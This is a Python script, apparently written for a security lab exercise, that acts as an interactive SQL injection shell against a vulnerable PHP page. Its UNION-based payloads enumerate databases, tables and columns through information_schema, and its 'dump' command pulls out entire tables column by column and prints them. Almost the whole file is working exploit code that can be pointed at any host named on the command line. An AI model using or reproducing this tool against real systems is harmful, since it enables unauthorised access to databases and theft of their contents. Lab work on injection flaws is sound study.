import sys
import requests
import pandas as pd
from bs4 import BeautifulSoup
serverbaseurl = 'http://'+sys.argv[1] #construct server url

try:								  #test if connection can be made
	testconn = requests.get(serverbaseurl, timeout=30)
except requests.ConnectionError as e:
	print('There was a connection error, or the server is not running.\n')
except requests.Timeout as e:
	print('Connection Timed Out.\n')
sqlibasetarget = serverbaseurl + '/sqli/example1.php?name=-%27' #the url that opens the exploit
targetcloseurl ='' 
usrinput = ''
while(usrinput != 'quit'):
	usrinput = input('lab3sqli> ')
	if(usrinput == 'quit'):
		break
	if(usrinput == 'dbs'): #getting a list of all the databases requires the exploit ask for a list of all schemas in the information schema, which is a database of metadata
		functioncall = usrinput
		sqlitarget = sqlibasetarget + '+union+all+select+concat(schema_name),null,null,null,null+from+information_schema.schemata--+'
	elif(usrinput.startswith('tables')): #this is similar to above, except we specify what database we want and that we want table names
		functioncall, database = usrinput.split()
		sqlitarget =   sqlibasetarget + '+union+all+select+table_name,null,null,null,null+from+information_schema.tables+where+table_schema=%22'+database+'%22--+--+'
	elif(usrinput.startswith('columns') or usrinput.startswith('dump')): #very similiar to above, except we specify columns instead. We use this for dump method so that way we can get the number of columns and their names
		functioncall, database, table = usrinput.split()
		sqlitarget = sqlibasetarget + '+union+all+select+column_name,null,null,null,null+from+information_schema.columns+where+table_name=%22'+table+'%22--+--+'
	else:
		print("bad input")
		break
	try:
		sqliconn = requests.get(sqlitarget+targetcloseurl, timeout=30) #get the table request
	except requests.ConnectionError as e:
		print('There was a connection error, or the server is not running.\n')
	except requests.Timeout as e:
		print('Connection Timed Out.\n')
	soup = BeautifulSoup(sqliconn.content, "html.parser")
	souptable = soup.find('table')
	testtable = pd.read_html(str(souptable)) #this and above command gets all tables in the page and puts them in an array
	tableout = testtable[0] #we expect only one table, so it is the first index
	if(functioncall == 'dbs'): #for these checks, we get the DataFrame table and pop the first column off as a result, renaming column header as necessary since this has the data we're interested in
		tableout = tableout.pop('id')
		tableout.rename('databases', inplace=True)
	if(functioncall == 'tables'):
		tableout = tableout.pop('id')
		tableout.rename(database+' tables', inplace=True)
	if(functioncall == 'columns'):
		tableout = tableout.pop('id')
		tableout.rename(table+' columns', inplace=True)
	if(functioncall == 'dump'):
		for x in range(tableout.shape[0]): #we iterate through each column name, and then make a request for the data in each column
			col = tableout.iat[x,0]
			sqlicoltarget = sqlibasetarget + '+union+all+select+'+database+'.'+table+'.'+col+'+as+id,null,null,null,null+from+'+database+'.'+table+'--+'
			#this will make explict calls to the desired database to retrieve a desired column, aliased as "id" so that it gets output to our exploit
			try:
				sqlicolconn = requests.get(sqlicoltarget+targetcloseurl, timeout=30)
			except requests.ConnectionError as e:
				print('There was a connection error, or the server is not running.\n')
			except requests.Timeout as e:
				print('Connection Timed Out.\n')
			colsoup = BeautifulSoup(sqlicolconn.content, "html.parser")
			colsouptable = colsoup.find('table')
			coltesttable = pd.read_html(str(colsouptable))
			coltableout = coltesttable[0].pop('id')
			coltableout.rename(col, inplace=True)
			if(x==0): #for the first run, do nothing extra, since we have one column. Subsequent runs, we append the column to the output table
				colout = coltableout
			else:
				colout = pd.concat([colout, coltableout], axis=1)
		print(colout.to_markdown())	#when we're done, print it out
			
			
	if(functioncall != 'dump'):
		print(tableout.to_markdown())
